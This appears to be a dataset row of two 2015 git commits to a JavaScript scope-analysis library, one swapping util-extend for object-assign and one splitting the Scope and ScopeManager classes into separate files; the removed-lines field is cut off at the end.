17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,41,1 Jan 2015,Use object-assign,0,0,2,58,2052,"+        objectAssign<c><\n>+    objectAssign = require('object-assign');<\n>+    objectAssign(Importer.prototype<c> {<\n>+        visitImport: function (id<c> specifier) {<\n>+            var that = this;<\n>+            that.referencer.visitPattern(id<c> function (pattern) {<\n>+                that.referencer.currentScope().__define(pattern<c> {<\n>+                    type: Variable.ImportBinding<c><\n>+                    name: pattern<c><\n>+                    node: specifier<c><\n>+                    parent: that.declaration<\n>+                });<\n>+        }<c><\n>+        ImportNamespaceSpecifier: function (node) {<\n>+            if (node.id) {<\n>+                this.visitImport(node.id<c> node);<\n>+            }<\n>+        }<c><\n>+        ImportDefaultSpecifier: function (node) {<\n>+        }<c><\n>+        ImportSpecifier: function (node) {<\n>+            if (node.name) {<\n>+                this.visitImport(node.name<c> node);<\n>+            } else {<\n>+                this.visitImport(node.id<c> node);<\n>+            }<\n>+    });<\n>+    objectAssign(Referencer.prototype<c> {<\n>+    ""estraverse"": "">=1.9.1""<c><\n>+    ""object-assign"": ""^2.0.0""<\n>","-        extend<c><\n>-    extend = require('util-extend');<\n>-    Importer.prototype.visitImport = function (id<c> specifier) {<\n>-        var that = this;<\n>-        that.referencer.visitPattern(id<c> function (pattern) {<\n>-            that.referencer.currentScope().__define(pattern<c> {<\n>-                type: Variable.ImportBinding<c><\n>-                name: pattern<c><\n>-                node: specifier<c><\n>-                parent: that.declaration<\n>-        });<\n>-    };<\n>-    Importer.prototype.ImportNamespaceSpecifier = function (node) {<\n>-        if (node.id) {<\n>-            this.visitImport(node.id<c> node);<\n>-        }<\n>-    };<\n>-    Importer.prototype.ImportDefaultSpecifier = function (node) {<\n>-        this.visitImport(node.id<c> node);<\n>-    };<\n>-    Importer.prototype.ImportSpecifier = function (node) {<\n>-        if (node.name) {<\n>-            this.visitImport(node.name<c> node);<\n>-        } else {<\n>-    };<\n>-    extend(Referencer.prototype<c> {<\n>-    ""estraverse"": "">=1.9.0""<c><\n>-    ""util-extend"": ""^1.0.1""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,37,1 Jan 2015,Split out Scope ScopeManager into files,0,3,1,1125,45391,"+        Scope<c><\n>+        ScopeManager<c><\n>+        utility<c><\n>+        esrecurse;<\n>+    Scope = require('./scope');<\n>+    ScopeManager = require('./scope-manager');<\n>+    utility = require('./utility');<\n>+            utility.assert(this.scopeManager.__isES6() && this.scopeManager.isModule());<\n>+        utility.assert(scopeManager.__currentScope === null);<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    var WeakMap<c> Scope;<\n>+    WeakMap = require('es6-weak-map');<\n>+    Scope = require('./scope');<\n>+    /**<\n>+     * @class ScopeManager<\n>+     */<\n>+    function ScopeManager(options) {<\n>+        this.scopes = [];<\n>+        this.globalScope = null;<\n>+        this.__nodeToScope = new WeakMap();<\n>+        this.__currentScope = null;<\n>+        this.__options = options;<\n>+    }<\n>+    ScopeManager.prototype.__useDirective = function () {<\n>+        return this.__options.directive;<\n>+    };<\n>+    ScopeManager.prototype.__isOptimistic = function () {<\n>+        return this.__options.optimistic;<\n>+    };<\n>+    ScopeManager.prototype.__ignoreEval = function () {<\n>+        return this.__options.ignoreEval;<\n>+    };<\n>+    ScopeManager.prototype.isModule = function () {<\n>+        return this.__options.sourceType === 'module';<\n>+    };<\n>+    // Returns appropliate scope for this node.<\n>+    ScopeManager.prototype.__get = function __get(node) {<\n>+        return this.__nodeToScope.get(node);<\n>+    };<\n>+    ScopeManager.prototype.acquire = function acquire(node<c> inner) {<\n>+        var scopes<c> scope<c> i<c> iz;<\n>+        function predicate(scope) {<\n>+            if (scope.type === 'function' && scope.functionExpressionScope) {<\n>+                return false;<\n>+            }<\n>+            if (scope.type === 'TDZ') {<\n>+                return false;<\n>+            }<\n>+            return true;<\n>+        }<\n>+        scopes = this.__get(node);<\n>+        if (!scopes || scopes.length === 0) {<\n>+            return null;<\n>+        }<\n>+        // Heuristic selection from all scopes.<\n>+        // If you would like to get all scopes<c> please use ScopeManager#acquireAll.<\n>+        if (scopes.length === 1) {<\n>+            return scopes[0];<\n>+        }<\n>+        if (inner) {<\n>+            for (i = scopes.length - 1; i >= 0; --i) {<\n>+                scope = scopes[i];<\n>+                if (predicate(scope)) {<\n>+                    return scope;<\n>+                }<\n>+            }<\n>+        } else {<\n>+            for (i = 0<c> iz = scopes.length; i < iz; ++i) {<\n>+                scope = scopes[i];<\n>+                if (predicate(scope)) {<\n>+                    return scope;<\n>+                }<\n>+            }<\n>+        }<\n>+        return null;<\n>+    };<\n>+    ScopeManager.prototype.acquireAll = function acquire(node) {<\n>+        return this.__get(node);<\n>+    };<\n>+    ScopeManager.prototype.release = function release(node<c> inner) {<\n>+        var scopes<c> scope;<\n>+        scopes = this.__get(node);<\n>+        if (scopes && scopes.length) {<\n>+            scope = scopes[0].upper;<\n>+            if (!scope) {<\n>+                return null;<\n>+            }<\n>+            return this.acquire(scope.block<c> inner);<\n>+        }<\n>+        return null;<\n>+    };<\n>+    ScopeManager.prototype.attach = function attach() { };<\n>+    ScopeManager.prototype.detach = function detach() { };<\n>+    ScopeManager.prototype.__nestScope = function (node<c> isMethodDefinition) {<\n>+        return new Scope(this<c> node<c> isMethodDefinition<c> Scope.SCOPE_NORMAL);<\n>+    };<\n>+    ScopeManager.prototype.__nestModuleScope = function (node) {<\n>+        return new Scope(this<c> node<c> false<c> Scope.SCOPE_MODULE);<\n>+    };<\n>+    ScopeManager.prototype.__nestTDZScope = function (node) {<\n>+        return new Scope(this<c> node<c> false<c> Scope.SCOPE_TDZ);<\n>+    };<\n>+    ScopeManager.prototype.__nestFunctionExpressionNameScope = function (node<c> isMethodDefinition) {<\n>+        return new Scope(this<c> node<c> isMethodDefinition<c> Scope.SCOPE_FUNCTION_EXPRESSION_NAME);<\n>+    };<\n>+    ScopeManager.prototype.__isES6 = function () {<\n>+        return this.__options.ecmaVersion >= 6;<\n>+    };<\n>+    module.exports = ScopeManager;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    var Syntax<c><\n>+        Map<c><\n>+        Reference<c><\n>+        Variable<c><\n>+        utility;<\n>+    Syntax = require('estraverse').Syntax;<\n>+    Map = require('es6-map');<\n>+    Reference = require('./reference');<\n>+    Variable = require('./variable');<\n>+    utility = require('./utility');<\n>+    function isStrictScope(scope<c> block<c> isMethodDefinition<c> useDirective) {<\n>+        var body<c> i<c> iz<c> stmt<c> expr;<\n>+        // When upper scope is exists and strict<c> inner scope is also strict.<\n>+        if (scope.upper && scope.upper.isStrict) {<\n>+            return true;<\n>+        }<\n>+        // ArrowFunctionExpression's scope is always strict scope.<\n>+        if (block.type === Syntax.ArrowFunctionExpression) {<\n>+            return true;<\n>+        }<\n>+        if (isMethodDefinition) {<\n>+            return true;<\n>+        }<\n>+        if (scope.type === 'class' || scope.type === 'module') {<\n>+            return true;<\n>+        }<\n>+        if (scope.type === 'block' || scope.type === 'switch') {<\n>+            return false;<\n>+        }<\n>+        if (scope.type === 'function') {<\n>+            body = block.body;<\n>+        } else if (scope.type === 'global') {<\n>+            body = block;<\n>+        } else {<\n>+            return false;<\n>+        }<\n>+        // Search 'use strict' directive.<\n>+        if (useDirective) {<\n>+            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+                stmt = body.body[i];<\n>+                if (stmt.type !== 'DirectiveStatement') {<\n>+                    break;<\n>+                }<\n>+                if (stmt.raw === '""use strict""' || stmt.raw === '\'use strict\'') {<\n>+                    return true;<\n>+                }<\n>+            }<\n>+        } else {<\n>+            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+                stmt = body.body[i];<\n>+                if (stmt.type !== Syntax.ExpressionStatement) {<\n>+                    break;<\n>+                }<\n>+                expr = stmt.expression;<\n>+                if (expr.type !== Syntax.Literal || typeof expr.value !== 'string') {<\n>+                    break;<\n>+                }<\n>+                if (expr.raw != null) {<\n>+                    if (expr.raw === '""use strict""' || expr.raw === '\'use strict\'') {<\n>+                        return true;<\n>+                    }<\n>+                } else {<\n>+                    if (expr.value === 'use strict') {<\n>+                        return true;<\n>+                    }<\n>+                }<\n>+            }<\n>+        }<\n>+        return false;<\n>+    }<\n>+    function registerScope(scopeManager<c> scope) {<\n>+        var scopes;<\n>+        scopeManager.scopes.push(scope);<\n>+        scopes = scopeManager.__nodeToScope.get(scope.block);<\n>+        if (scopes) {<\n>+            scopes.push(scope);<\n>+        } else {<\n>+            scopeManager.__nodeToScope.set(scope.block<c> [ scope ]);<\n>+        }<\n>+    }<\n>+    /* Special Scope types. */<\n>+    var SCOPE_NORMAL = 0<c><\n>+        SCOPE_MODULE = 1<c><\n>+        SCOPE_FUNCTION_EXPRESSION_NAME = 2<c><\n>+        SCOPE_TDZ = 3;<\n>+    /**<\n>+     * @class Scope<\n>+     */<\n>+    function Scope(scopeManager<c> block<c> isMethodDefinition<c> scopeType) {<\n>+        /**<\n>+         * One of 'catch'<c> 'with'<c> 'function'<c> 'global' or 'block'.<\n>+         * @member {String} Scope#type<\n>+         */<\n>+        this.type =<\n>+            (scopeType === SCOPE_TDZ) ? 'TDZ' :<\n>+            (scopeType === SCOPE_MODULE) ? 'module' :<\n>+            (block.type === Syntax.BlockStatement) ? 'block' :<\n>+            (block.type === Syntax.SwitchStatement) ? 'switch' :<\n>+            (block.type === Syntax.FunctionExpression || block.type === Syntax.FunctionDeclaration || block.type === Syntax.ArrowFunctionExpression) ? 'function' :<\n>+            (block.type === Syntax.CatchClause) ? 'catch' :<\n>+            (block.type === Syntax.ForInStatement || block.type === Syntax.ForOfStatement || block.type === Syntax.ForStatement) ? 'for' :<\n>+            (block.type === Syntax.WithStatement) ? 'with' :<\n>+            (block.type === Syntax.ClassExpression || block.type === Syntax.ClassDeclaration) ? 'class' : 'global';<\n>+         /**<\n>+         * The scoped {@link Variable}s of this scope<c> as <code>{ Variable.name<\n>+         * : Variable }</code>.<\n>+         * @member {Map} Scope#set<\n>+         */<\n>+        this.set = new Map();<\n>+        /**<\n>+         * The tainted variables of this scope<c> as <code>{ Variable.name :<\n>+         * boolean }</code>.<\n>+         * @member {Map} Scope#taints */<\n>+        this.taints = new Map();<\n>+        /**<\n>+         * Generally<c> through the lexical scoping of JS you can always know<\n>+         * which variable an identifier in the source code refers to. There are<\n>+         * a few exceptions to this rule. With 'global' and 'with' scopes you<\n>+         * can only decide at runtime which variable a reference refers to.<\n>+         * Moreover<c> if 'eval()' is used in a scope<c> it might introduce new<\n>+         * bindings in this or its prarent scopes.<\n>+         * All those scopes are considered 'dynamic'.<\n>+         * @member {boolean} Scope#dynamic<\n>+         */<\n>+        this.dynamic = this.type === 'global' || this.type === 'with';<\n>+        /**<\n>+         * A reference to the scope-defining syntax node.<\n>+         * @member {esprima.Node} Scope#block<\n>+         */<\n>+        this.block = block;<\n>+         /**<\n>+         * The {@link Reference|references} that are not resolved with this scope.<\n>+         * @member {Reference[]} Scope#through<\n>+         */<\n>+        this.through = [];<\n>+         /**<\n>+         * The scoped {@link Variable}s of this scope. In the case of a<\n>+         * 'function' scope this includes the automatic argument <em>arguments</em> as<\n>+         * its first element<c> as well as all further formal arguments.<\n>+         * @member {Variable[]} Scope#variables<\n>+         */<\n>+        this.variables = [];<\n>+         /**<\n>+         * Any variable {@link Reference|reference} found in this scope. This<\n>+         * includes occurrences of local variables as well as variables from<\n>+         * parent scopes (including the global scope). For local variables<\n>+         * this also includes defining occurrences (like in a 'var' statement).<\n>+         * In a 'function' scope this does not include the occurrences of the<\n>+         * formal parameter in the parameter list.<\n>+         * @member {Reference[]} Scope#references<\n>+         */<\n>+        this.references = [];<\n>+         /**<\n>+         * For 'global' and 'function' scopes<c> this is a self-reference. For<\n>+         * other scope types this is the <em>variableScope</em> value of the<\n>+         * parent scope.<\n>+         * @member {Scope} Scope#variableScope<\n>+         */<\n>+        this.variableScope =<\n>+            (this.type === 'global' || this.type === 'function' || this.type === 'module') ? this : scopeManager.__currentScope.variableScope;<\n>+         /**<\n>+         * Whether this scope is created by a FunctionExpression.<\n>+         * @member {boolean} Scope#functionExpressionScope<\n>+         */<\n>+        this.functionExpressionScope = false;<\n>+         /**<\n>+         * Whether this is a scope that contains an 'eval()' invocation.<\n>+         * @member {boolean} Scope#directCallToEvalScope<\n>+         */<\n>+        this.directCallToEvalScope = false;<\n>+         /**<\n>+         * @member {boolean} Scope#thisFound<\n>+         */<\n>+        this.thisFound = false;<\n>+        this.__left = [];<\n>+        if (scopeType === SCOPE_FUNCTION_EXPRESSION_NAME) {<\n>+            this.__define(block.id<c> {<\n>+                type: Variable.FunctionName<c><\n>+                name: block.id<c><\n>+                node: block<\n>+            });<\n>+            this.functionExpressionScope = true;<\n>+        } else {<\n>+            // section 9.2.13<c> FunctionDeclarationInstantiation.<\n>+            // NOTE Arrow functions never have an arguments objects.<\n>+            if (this.type === 'function' && this.block.type !== Syntax.ArrowFunctionExpression) {<\n>+                this.__defineArguments();<\n>+            }<\n>+            if (block.type === Syntax.FunctionExpression && block.id) {<\n>+                scopeManager.__nestFunctionExpressionNameScope(block<c> isMethodDefinition);<\n>+            }<\n>+        }<\n>+         /**<\n>+         * Reference to the parent {@link Scope|scope}.<\n>+         * @member {Scope} Scope#upper<\n>+         */<\n>+        this.upper = scopeManager.__currentScope;<\n>+         /**<\n>+         * Whether 'use strict' is in effect in this scope.<\n>+         * @member {boolean} Scope#isStrict<\n>+         */<\n>+        this.isStrict = isStrictScope(this<c> block<c> isMethodDefinition<c> scopeManager.__useDirective());<\n>+         /**<\n>+         * List of nested {@link Scope}s.<\n>+         * @member {Scope[]} Scope#childScopes<\n>+         */<\n>+        this.childScopes = [];<\n>+        if (scopeManager.__currentScope) {<\n>+            scopeManager.__currentScope.childScopes.push(this);<\n>+        }<\n>+        // RAII<\n>+        scopeManager.__currentScope = this;<\n>+        if (this.type === 'global') {<\n>+            scopeManager.globalScope = this;<\n>+            scopeManager.globalScope.implicit = {<\n>+                set: new Map()<c><\n>+                variables: []<c><\n>+                /**<\n>+                * List of {@link Reference}s that are left to be resolved (i.e. which<\n>+                * need to be linked to the variable they refer to).<\n>+                * @member {Reference[]} Scope#implicit#left<\n>+                */<\n>+                left: []<\n>+            };<\n>+        }<\n>+        registerScope(scopeManager<c> this);<\n>+    }<\n>+    Scope.prototype.__close = function __close(scopeManager) {<\n>+        var i<c> iz<c> ref<c> current<c> implicit<c> info;<\n>+        // Because if this is global environment<c> upper is null<\n>+        if (!this.dynamic || scopeManager.__isOptimistic()) {<\n>+            // static resolve<\n>+            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                ref = this.__left[i];<\n>+                if (!this.__resolve(ref)) {<\n>+                    this.__delegateToUpperScope(ref);<\n>+                }<\n>+            }<\n>+        } else {<\n>+            // this is ""global"" / ""with"" / ""function with eval"" environment<\n>+            if (this.type === 'with') {<\n>+                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                    ref = this.__left[i];<\n>+                    ref.tainted = true;<\n>+                    this.__delegateToUpperScope(ref);<\n>+                }<\n>+            } else {<\n>+                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                    // notify all names are through to global<\n>+                    ref = this.__left[i];<\n>+                    current = this;<\n>+                    do {<\n>+                        current.through.push(ref);<\n>+                        current = current.upper;<\n>+                    } while (current);<\n>+                }<\n>+            }<\n>+        }<\n>+        if (this.type === 'global') {<\n>+            implicit = [];<\n>+            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                ref = this.__left[i];<\n>+                if (ref.__maybeImplicitGlobal && !this.set.has(ref.identifier.name)) {<\n>+                    implicit.push(ref.__maybeImplicitGlobal);<\n>+                }<\n>+            }<\n>+            // create an implicit global variable from assignment expression<\n>+            for (i = 0<c> iz = implicit.length; i < iz; ++i) {<\n>+                info = implicit[i];<\n>+                this.__defineImplicit(info.pattern<c> {<\n>+                    type: Variable.ImplicitGlobalVariable<c><\n>+                    name: info.pattern<c><\n>+                    node: info.node<\n>+                });<\n>+            }<\n>+            this.implicit.left = this.__left;<\n>+        }<\n>+        this.__left = null;<\n>+        scopeManager.__currentScope = this.upper;<\n>+    };<\n>+    Scope.prototype.__resolve = function __resolve(ref) {<\n>+        var variable<c> name;<\n>+        name = ref.identifier.name;<\n>+        if (this.set.has(name)) {<\n>+            variable = this.set.get(name);<\n>+            variable.references.push(ref);<\n>+            variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>+            if (ref.tainted) {<\n>+                variable.tainted = true;<\n>+                this.taints.set(variable.name<c> true);<\n>+            }<\n>+            ref.resolved = variable;<\n>+            return true;<\n>+        }<\n>+        return false;<\n>+    };<\n>+    Scope.prototype.__delegateToUpperScope = function __delegateToUpperScope(ref) {<\n>+        if (this.upper) {<\n>+            this.upper.__left.push(ref);<\n>+        }<\n>+        this.through.push(ref);<\n>+    };<\n>+    Scope.prototype.__defineGeneric = function (name<c> set<c> variables<c> node<c> info) {<\n>+        var variable;<\n>+        variable = set.get(name);<\n>+        if (!variable) {<\n>+            variable = new Variable(name<c> this);<\n>+            set.set(name<c> variable);<\n>+            variables.push(variable);<\n>+        }<\n>+        if (info) {<\n>+            variable.defs.push(info);<\n>+        }<\n>+        if (node) {<\n>+            variable.identifiers.push(node);<\n>+        }<\n>+    };<\n>+    Scope.prototype.__defineArguments = function () {<\n>+        this.__defineGeneric('arguments'<c> this.set<c> this.variables);<\n>+        this.taints.set('arguments'<c> true);<\n>+    };<\n>+    Scope.prototype.__defineImplicit = function (node<c> info) {<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            this.__defineGeneric(node.name<c> this.implicit.set<c> this.implicit.variables<c> node<c> info);<\n>+        }<\n>+    };<\n>+    Scope.prototype.__define = function (node<c> info) {<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            this.__defineGeneric(node.name<c> this.set<c> this.variables<c> node<c> info);<\n>+        }<\n>+    };<\n>+    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>+        var ref;<\n>+        // because Array element may be null<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial);<\n>+            this.references.push(ref);<\n>+            this.__left.push(ref);<\n>+        }<\n>+    };<\n>+    Scope.prototype.__detectEval = function __detectEval() {<\n>+        var current;<\n>+        current = this;<\n>+        this.directCallToEvalScope = true;<\n>+        do {<\n>+            current.dynamic = true;<\n>+            current = current.upper;<\n>+        } while (current);<\n>+    };<\n>+    Scope.prototype.__detectThis = function __detectThis() {<\n>+        this.thisFound = true;<\n>+    };<\n>+    Scope.prototype.__isClosed = function isClosed() {<\n>+        return this.__left === null;<\n>+    };<\n>+    // API Scope#resolve(name)<\n>+    // returns resolved reference<\n>+    Scope.prototype.resolve = function resolve(ident) {<\n>+        var ref<c> i<c> iz;<\n>+        utility.assert(this.__isClosed()<c> 'scope should be closed');<\n>+        utility.assert(ident.type === Syntax.Identifier<c> 'target should be identifier');<\n>+        for (i = 0<c> iz = this.references.length; i < iz; ++i) {<\n>+            ref = this.references[i];<\n>+            if (ref.identifier === ident) {<\n>+                return ref;<\n>+            }<\n>+        }<\n>+        return null;<\n>+    };<\n>+    // API Scope#isStatic<\n>+    // returns this scope is static<\n>+    Scope.prototype.isStatic = function isStatic() {<\n>+        return !this.dynamic;<\n>+    };<\n>+    // API Scope#isArgumentsMaterialized<\n>+    // return this scope has materialized arguments<\n>+    Scope.prototype.isArgumentsMaterialized = function isArgumentsMaterialized() {<\n>+        // TODO(Constellation)<\n>+        // We can more aggressive on this condition like this.<\n>+        //<\n>+        // function t() {<\n>+        //     // arguments of t is always hidden.<\n>+        //     function arguments() {<\n>+        //     }<\n>+        // }<\n>+        var variable;<\n>+        // This is not function scope<\n>+        if (this.type !== 'function') {<\n>+            return true;<\n>+        }<\n>+        if (!this.isStatic()) {<\n>+            return true;<\n>+        }<\n>+        variable = this.set.get('arguments');<\n>+        utility.assert(variable<c> 'always have arguments variable');<\n>+        return variable.tainted || variable.references.length  !== 0;<\n>+    };<\n>+    // API Scope#isThisMaterialized<\n>+    // return this scope has materialized `this` reference<\n>+    Scope.prototype.isThisMaterialized = function isThisMaterialized() {<\n>+        // This is not function scope<\n>+        if (this.type !== 'function') {<\n>+            return true;<\n>+        }<\n>+        if (!this.isStatic()) {<\n>+            return true;<\n>+        }<\n>+        return this.thisFound;<\n>+    };<\n>+    Scope.prototype.isUsedName = function (name) {<\n>+        if (this.set.has(name)) {<\n>+            return true;<\n>+        }<\n>+        for (var i = 0<c> iz = this.through.length; i < iz; ++i) {<\n>+            if (this.through[i].identifier.name === name) {<\n>+                return true;<\n>+            }<\n>+        }<\n>+        return false;<\n>+    };<\n>+    Scope.SCOPE_NORMAL = SCOPE_NORMAL;<\n>+    Scope.SCOPE_MODULE = SCOPE_MODULE;<\n>+    Scope.SCOPE_FUNCTION_EXPRESSION_NAME = SCOPE_FUNCTION_EXPRESSION_NAME;<\n>+    Scope.SCOPE_TDZ = SCOPE_TDZ;<\n>+    module.exports = Scope;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    function assert(cond<c> text) {<\n>+        if (!cond) {<\n>+            throw new Error(text);<\n>+        }<\n>+    }<\n>+    exports.assert = assert;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>","-        esrecurse<c><\n>-        Map<c><\n>-        WeakMap;<\n>-    Map = require('es6-map');<\n>-    WeakMap = require('es6-weak-map');<\n>-    function assert(cond<c> text) {<\n>-        if (!cond) {<\n>-            throw new Error(text);<\n>-        }<\n>-    }<\n>-    function isStrictScope(scope<c> block<c> isMethodDefinition<c> useDirective) {<\n>-        var body<c> i<c> iz<c> stmt<c> expr;<\n>-        // When upper scope is exists and strict<c> inner scope is also strict.<\n>-        if (scope.upper && scope.upper.isStrict) {<\n>-            return true;<\n>-        }<\n>-        // ArrowFunctionExpression's scope is always strict scope.<\n>-        if (block.type === Syntax.ArrowFunctionExpression) {<\n>-            return true;<\n>-        }<\n>-        if (isMethodDefinition) {<\n>-            return true;<\n>-        }<\n>-        if (scope.type === 'class' || scope.type === 'module') {<\n>-            return true;<\n>-        }<\n>-        if (scope.type === 'block' || scope.type === 'switch') {<\n>-            return false;<\n>-        }<\n>-        if (scope.type === 'function') {<\n>-            body = block.body;<\n>-        } else if (scope.type === 'global') {<\n>-            body = block;<\n>-        } else {<\n>-            return false;<\n>-        }<\n>-        // Search 'use strict' directive.<\n>-        if (useDirective) {<\n>-            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>-                stmt = body.body[i];<\n>-                if (stmt.type !== 'DirectiveStatement') {<\n>-                    break;<\n>-                }<\n>-                if (stmt.raw === '""use strict""' || stmt.raw === '\'use strict\'') {<\n>-                    return true;<\n>-                }<\n>-            }<\n>-        } else {<\n>-            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>-                stmt = body.body[i];<\n>-                if (stmt.type !== Syntax.ExpressionStatement) {<\n>-                    break;<\n>-                }<\n>-                expr = stmt.expression;<\n>-                if (expr.type !== Syntax.Literal || typeof expr.value !== 'string') {<\n>-                    break;<\n>-                }<\n>-                if (expr.raw != null) {<\n>-                    if (expr.raw === '""use strict""' || expr.raw === '\'use strict\'') {<\n>-                        return true;<\n>-                    }<\n>-                } else {<\n>-                    if (expr.value === 'use strict') {<\n>-                        return true;<\n>-                    }<\n>-                }<\n>-            }<\n>-        }<\n>-        return false;<\n>-    }<\n>-    function registerScope(scopeManager<c> scope) {<\n>-        var scopes;<\n>-        scopeManager.scopes.push(scope);<\n>-        scopes = scopeManager.__nodeToScope.get(scope.block);<\n>-        if (scopes) {<\n>-            scopes.push(scope);<\n>-        } else {<\n>-            scopeManager.__nodeToScope.set(scope.block<c> [ scope ]);<\n>-        }<\n>-    }<\n>-    /* Special Scope types. */<\n>-    var SCOPE_NORMAL = 0<c><\n>-        SCOPE_MODULE = 1<c><\n>-        SCOPE_FUNCTION_EXPRESSION_NAME = 2<c><\n>-        SCOPE_TDZ = 3;<\n>-    /**<\n>-     * @class Scope<\n>-     */<\n>-    function Scope(scopeManager<c> block<c> isMethodDefinition<c> scopeType) {<\n>-        /**<\n>-         * One of 'catch'<c> 'with'<c> 'function'<c> 'global' or 'block'.<\n>-         * @member {String} Scope#type<\n>-         */<\n>-        this.type =<\n>-            (scopeType === SCOPE_TDZ) ? 'TDZ' :<\n>-            (scopeType === SCOPE_MODULE) ? 'module' :<\n>-            (block.type === Syntax.BlockStatement) ? 'block' :<\n>-            